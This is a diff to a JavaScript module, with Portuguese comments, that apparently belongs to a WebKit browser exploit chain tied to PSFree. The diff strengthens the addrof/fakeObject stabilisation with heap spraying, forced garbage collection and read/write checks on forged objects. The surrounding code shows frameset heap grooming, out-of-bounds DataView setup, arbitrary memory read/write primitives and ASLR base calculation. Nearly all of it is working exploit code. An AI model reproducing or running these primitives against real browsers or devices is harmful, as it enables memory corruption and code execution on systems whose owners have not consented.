@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v21 - Calculo ASLR CORRETO da Base WebKit - Integrado com PSFree - VERSÃO DE DEPURACAO)
+// js/script3/testArrayBufferVictimCrash.mjs (v22 - Calculo ASLR CORRETO da Base WebKit - Integrado com PSFree - VERSÃO DE DEPURACAO)
 
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
@@ -36,7 +36,7 @@ import {
 } from '../module/memtools.mjs';
 import * as off from '../module/offset.mjs'; // Importa todos os offsets
 
-export const FNAME_MODULE = "v21 - Calculo ASLR CORRETO da Base WebKit"; // Versão atualizada
+export const FNAME_MODULE = "v22 - Calculo ASLR CORRETO da Base WebKit"; // Versão atualizada
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -100,7 +100,6 @@ export async function readUniversalJSHeap(address, byteLength, logFn) {
 
     let addressAsInt = address;
     if (!(address instanceof Int || address instanceof Addr)) {
-        // Isso é para compatibilidade com o antigo AdvancedInt64 que ainda pode ser retornado em alguns lugares
         addressAsInt = new Int(address.low(), address.high());
     }
     
@@ -138,7 +137,6 @@ export async function writeUniversalJSHeap(address, value, byteLength, logFn) {
     
     let addressAsInt = address;
     if (!(address instanceof Int || address instanceof Addr)) {
-        // Isso é para compatibilidade com o antigo AdvancedInt64 que ainda pode ser retornado em alguns lugares
         addressAsInt = new Int(address.low(), address.high());
     }
 
@@ -246,17 +244,19 @@ async function attemptUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PA
 async function triggerGC(logFn, pauseFn) {
     logFn("    Acionando GC...", "info", "GC_Trigger");
     try {
+        // Alocar muitos ArrayBuffers para esgotar a memória e forçar GC
         for (let i = 0; i < 500; i++) {
-            new ArrayBuffer(1024 * 256);
+            new ArrayBuffer(1024 * 256); // 256KB por buffer
         }
     } catch (e) {
         logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
     }
-    await pauseFn(LOCAL_SHORT_PAUSE);
+    await pauseFn(LOCAL_SHORT_PAUSE); // Pequena pausa
+    // Mais alocações para garantir que o GC ocorra
     for (let i = 0; i < 25; i++) {
-        new ArrayBuffer(1024);
+        new ArrayBuffer(1024); // 1KB por buffer
     }
-    await pauseFn(LOCAL_SHORT_PAUSE);
+    await pauseFn(LOCAL_SHORT_PAUSE); // Pequena pausa
 }
 
 /**
@@ -270,38 +270,45 @@ async function stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME = "stabilizeCorePrimitives";
     logFn(`[${FNAME}] Iniciando estabilização de getAddress/fakeObject via Heisenbug.`, "subtest", FNAME);
 
-    initializeCorePrimitives();
+    initializeCorePrimitives(); // Garante que confusedFloat64Array e victimArray existam
 
     // AUMENTAR TENTATIVAS DE ESTABILIZAÇÃO PARA DEPURACAO
-    const NUM_STABILIZATION_ATTEMPTS = 50; // Aumentado de 5 para 50
+    const NUM_STABILIZATION_ATTEMPTS = 100; // Aumentado de 5 para 100
     const GC_INTERVAL_ATTEMPTS = 5; // A cada 5 tentativas, força um GC
 
     for (let i = 0; i < NUM_STABILIZATION_ATTEMPTS; i++) {
         logFn(`[${FNAME}] Tentativa de estabilização #${i + 1}/${NUM_STABILIZATION_ATTEMPTS}.`, "info", FNAME);
 
-        heldObjects = [];
+        heldObjects = []; // Limpar heldObjects para cada tentativa, para influenciar o GC/heap layout
         // Forçar GC mais agressivamente em intervalos.
         if (i > 0 && i % GC_INTERVAL_ATTEMPTS === 0) {
             logFn(`[${FNAME}] Forçando GC na tentativa #${i + 1}...`, "info", FNAME);
             await triggerGC(logFn, pauseFn);
             logFn(`[${FNAME}] Heap limpo antes da tentativa de estabilização.`, "info", FNAME);
-            await pauseFn(LOCAL_MEDIUM_PAUSE);
+            await pauseFn(LOCAL_MEDIUM_PAUSE); // Pausa mais longa após GC
         } else {
-            // Pequena pausa para JIT/GC suave entre tentativas
-            await pauseFn(LOCAL_SHORT_SHORT_PAUSE);
+            await pauseFn(LOCAL_SHORT_SHORT_PAUSE); // Pequena pausa para JIT/GC suave entre tentativas
         }
 
         try {
-            let test_obj = { a: 0x11223344, b: 0x55667788 };
-            // Adicionar mais objetos para forçar o layout da memória
-            for(let j = 0; j < 10; j++) {
-                heldObjects.push({ dummy_a: j, dummy_b: j * 2, arr: new Array(j*10).fill(j) });
+            // Tentar diferentes tipos de objetos ou variações para testar o addrof/fakeobj
+            let test_obj_val;
+            if (i % 2 === 0) {
+                test_obj_val = { a: 0x11223344, b: 0x55667788, c: "test_string_" + i };
+            } else {
+                test_obj_val = [0xAA, 0xBB, 0xCC, i];
             }
-            heldObjects.push(test_obj); // Garantir que test_obj seja mantido
+            heldObjects.push(test_obj_val); // Garante que test_obj_val seja mantido
 
-            const addr = getAddress(test_obj); // Retorna Int
-            logFn(`[${FNAME}] getAddress para test_obj (${test_obj.toString()}) resultou em: ${addr.toString(true)}`, "debug", FNAME);
-            logFn(`[${FNAME}] Tipo de addr: ${typeof addr}, instance of Int: ${addr instanceof Int}`, "debug", FNAME); // Novo log de depuração
+            // Adicionar mais objetos ao spray para influenciar o heap layout
+            for(let j = 0; j < 50; j++) { // Mais objetos para forçar o layout
+                heldObjects.push({ dummy_a: j * i, dummy_b: j * i * 2, arr: new Array(j*10 + i).fill(j % 255), str: `spray_str_${i}_${j}` });
+            }
+
+
+            const addr = getAddress(test_obj_val); // Retorna Int
+            logFn(`[${FNAME}] getAddress para test_obj (${test_obj_val.toString()}) resultou em: ${addr.toString(true)}`, "debug", FNAME);
+            logFn(`[${FNAME}] Tipo de addr: ${typeof addr}, instance of Int: ${addr instanceof Int}`, "debug", FNAME);
 
             if (!(addr instanceof Int) || addr.eq(new Int(0,0))) {
                 logFn(`[${FNAME}] FALHA: getAddress retornou endereço inválido para test_obj. ENDERECO: ${addr.toString(true)}`, "error", FNAME);
@@ -309,30 +316,77 @@ async function stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS_PARAM) {
             }
 
             const faked_obj = fakeObject(addr); // addr é Int
-            logFn(`[${FNAME}] Objeto forjado: ${faked_obj} (typeof: ${typeof faked_obj})`, "debug", FNAME); // Novo log de depuração
+            logFn(`[${FNAME}] Objeto forjado: ${faked_obj} (typeof: ${typeof faked_obj})`, "debug", FNAME);
+            
+            // VERIFICAÇÃO MAIS ROBUSTA DO OBJETO FORJADO
             if (typeof faked_obj !== 'object' && typeof faked_obj !== 'function') {
                  logFn(`[${FNAME}] FALHA: fakeObject retornou tipo inesperado: ${typeof faked_obj}.`, "error", FNAME);
-                 throw new Error("fakeObject falhou na estabilização.");
+                 throw new Error("fakeObject retornou tipo inesperado.");
             }
-            // Tentar acessar uma propriedade e registrar seu valor
-            const original_val_a = faked_obj.a; // Esta linha provavelmente irá falhar se faked_obj não for um objeto válido ou se 'a' não existir
-            logFn(`[${FNAME}] Valor original de a em objeto forjado: ${toHex(original_val_a)}`, "debug", FNAME);
 
-            faked_obj.a = 0xDEADC0DE;
-            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
-            const new_val_a = faked_obj.a;
-            logFn(`[${FNAME}] Valor após escrita em forjado: ${toHex(new_val_a)}, Original real: ${toHex(test_obj.a)}`, "debug", FNAME);
-
-            if (new_val_a === 0xDEADC0DE && test_obj.a === 0xDEADC0DE) {
-                logFn(`[${FNAME}] SUCESSO: getAddress/fakeObject estabilizados e funcionando!`, "good", FNAME);
-                faked_obj.a = original_val_a; // Restaurar o valor original
-                return true;
+            // Acessar propriedades comuns para testar se é um objeto JS válido.
+            // Se test_obj_val é um objeto simples, acessa 'a'. Se for um array, tenta 'length'.
+            let original_val_prop;
+            if (test_obj_val.hasOwnProperty('a')) {
+                original_val_prop = faked_obj.a;
+                logFn(`[${FNAME}] DEBUG: Acessando faked_obj.a. Original: ${toHex(test_obj_val.a)}`, "debug", FNAME);
+                faked_obj.a = 0xDEADC0DE; // Tentar escrever
+                await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+                const new_val_a = faked_obj.a;
+                if (new_val_a === 0xDEADC0DE && test_obj_val.a === 0xDEADC0DE) {
+                    logFn(`[${FNAME}] SUCESSO: faked_obj.a R/W consistente.`, "good", FNAME);
+                    faked_obj.a = original_val_prop; // Restaurar
+                    return true;
+                } else {
+                    logFn(`[${FNAME}] FALHA: faked_obj.a R/W inconsistente. Original: ${toHex(original_val_prop)}, Escrito: ${toHex(0xDEADC0DE)}, Lido: ${toHex(new_val_a)}.`, "error", FNAME);
+                    throw new Error("fakeObject R/W inconsistent (property 'a').");
+                }
+            } else if (Array.isArray(test_obj_val)) {
+                // Se for um array, testar 'length' ou um elemento
+                original_val_prop = faked_obj.length;
+                logFn(`[${FNAME}] DEBUG: Acessando faked_obj.length. Original: ${toHex(test_obj_val.length)}`, "debug", FNAME);
+                // Cuidado ao escrever em 'length' de um array forjado, pode corromper.
+                // Apenas ler pode ser mais seguro para estabilização inicial.
+                if (original_val_prop === test_obj_val.length) {
+                    logFn(`[${FNAME}] SUCESSO: faked_obj.length leitura consistente.`, "good", FNAME);
+                    // Tentar acessar um elemento (se existir)
+                    if (test_obj_val.length > 0) {
+                        const original_elem = faked_obj[0];
+                        faked_obj[0] = 0xBBCCDD; // Tentar escrever num elemento
+                        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+                        const new_elem = faked_obj[0];
+                        if (new_elem === 0xBBCCDD && test_obj_val[0] === 0xBBCCDD) {
+                            logFn(`[${FNAME}] SUCESSO: faked_obj[0] R/W consistente.`, "good", FNAME);
+                            faked_obj[0] = original_elem; // Restaurar
+                            return true;
+                        } else {
+                            logFn(`[${FNAME}] FALHA: faked_obj[0] R/W inconsistente. Original: ${toHex(original_elem)}, Escrito: ${toHex(0xBBCCDD)}, Lido: ${toHex(new_elem)}.`, "error", FNAME);
+                            throw new Error("fakeObject R/W inconsistent (indexed property).");
+                        }
+                    } else { // Array vazio, apenas leitura de length verificada. Considerar sucesso.
+                         return true;
+                    }
+                } else {
+                    logFn(`[${FNAME}] FALHA: faked_obj.length leitura inconsistente. Lido: ${toHex(original_val_prop)}, Esperado: ${toHex(test_obj_val.length)}.`, "error", FNAME);
+                    throw new Error("fakeObject R/W inconsistent (property 'length').");
+                }
             } else {
-                logFn(`[${FNAME}] FALHA: getAddress/fakeObject inconsistentes. Original: ${toHex(original_val_a)}, Escrito: ${toHex(0xDEADC0DE)}, Lido: ${toHex(new_val_a)}.`, "error", FNAME);
-                throw new Error("fakeObject falhou na estabilização.");
+                logFn(`[${FNAME}] ALERTA: test_obj_val não é um objeto ou array comum para teste de R/W. Tipo: ${typeof test_obj_val}.`, "warn", FNAME);
+                // Se não for um tipo testável de forma simples, podemos tentar verificar a validade do objeto forjado
+                // usando algo como Object.keys ou Object.getOwnPropertyNames.
+                // MAS CUIDADO: Operações em objetos falsificados podem levar a crashes se a structure estiver muito corrompida.
+                try {
+                    const keys = Object.keys(faked_obj);
+                    logFn(`[${FNAME}] DEBUG: faked_obj tem ${keys.length} chaves: ${keys.join(',')}.`, "debug", FNAME);
+                    return true; // Se não crashou e tem chaves, talvez seja válido.
+                } catch (inspection_error) {
+                    logFn(`[${FNAME}] FALHA: Erro ao inspecionar objeto forjado: ${inspection_error.message}.`, "error", FNAME);
+                    throw new Error("Fake object inspection failed.");
+                }
             }
+
         } catch (e) {
-            logFn(`[${FNAME}] Erro durante tentativa de estabilização: ${e.message}\n${e.stack || ''}`, "warn", FNAME); // Adicionado stack trace para o erro
+            logFn(`[${FNAME}] Erro durante tentativa de estabilização: ${e.message}\n${e.stack || ''}`, "warn", FNAME);
         }
     }
 
@@ -393,7 +447,7 @@ export async function executeExploitChain(logFn, pauseFn) {
             fset.cols = rows_frameset;
             framesets.push(fset);
         }
-        heldObjects.push(framesets); // Evita GC prematuro
+        heldObjects.push(framesets);
         logFn(`    Spray de ${framesets.length} framesets concluído para grooming.`, "info");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
@@ -439,6 +493,7 @@ export async function executeExploitChain(logFn, pauseFn) {
         logFn(`Ambiente OOB configurado com DataView: ${oobDataView !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
+        // ESTE É O BLOCO MAIS CRÍTICO AGORA: A ESTABILIZAÇÃO DE GETADDRESS/FAKEOBJECT
         const addrof_fakeobj_stable = await stabilizeCorePrimitives(logFn, pauseFn, JSC_OFFSETS);
         if (!addrof_fakeobj_stable) {
             const errMsg = "Falha crítica: Não foi possível estabilizar getAddress/fakeObject. Abortando exploração.";
@@ -582,6 +637,7 @@ export async function executeExploitChain(logFn, pauseFn) {
                 logFn(`[${FNAME_CURRENT_TEST}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(foundMMode)}.`, "good");
                 break;
             } else {
+            // Não logar o stack trace completo aqui para cada tentativa falha, pois pode ser spam.
                 logFn(`[${FNAME_CURRENT_TEST}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
                 await pauseFn(LOCAL_SHORT_PAUSE);
             }
